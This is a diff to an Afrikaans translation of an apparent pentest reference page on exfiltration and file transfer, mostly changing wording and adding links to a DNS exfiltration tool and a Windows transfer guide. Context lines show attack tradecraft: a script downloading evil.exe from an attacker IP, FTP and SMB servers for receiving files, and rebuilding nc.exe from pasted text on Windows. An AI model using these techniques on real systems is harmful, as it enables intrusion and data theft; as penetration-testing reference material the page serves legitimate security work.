@@ -2,7 +2,7 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Gewoonlik goedgekeurde domeine om inligting te eksfiltreer
+## Gewoonlik goedgekeurde domeine om inligting te onttrek
 
 Kyk na [https://lots-project.com/](https://lots-project.com/) om gewoonlik goedgekeurde domeine te vind wat misbruik kan word
 
@@ -107,12 +107,12 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP bediener (NodeJS)
+### FTP-bediener (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP-bediener (pure-ftp)
+### FTP bediener (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -150,7 +150,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Of skep 'n smb deel **met samba**:
+Of skep 'n smb deel **met behulp van samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -296,14 +296,18 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe` program stel nie net in staat om binêre te inspekteer nie, maar het ook die **vermoë om dit uit hex te herbou**. Dit beteken dat deur 'n hex van 'n binêre te verskaf, kan `debug.exe` die binêre lêer genereer. Dit is egter belangrik om te noem dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte te monteer**.
+Die `debug.exe` program laat nie net inspeksie van binêre toe nie, maar het ook die **vermoë om hulle uit hex te herbou**. Dit beteken dat deur 'n hex van 'n binêre te verskaf, kan `debug.exe` die binêre lêer genereer. Dit is egter belangrik om te noem dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte te monteer**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Dan kopieer-en-plak die teks in die windows-shell en 'n lêer genaamd nc.exe sal geskep word.
+Dan kopieer-plak die teks in die windows-shell en 'n lêer genaamd nc.exe sal geskep word.
+
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
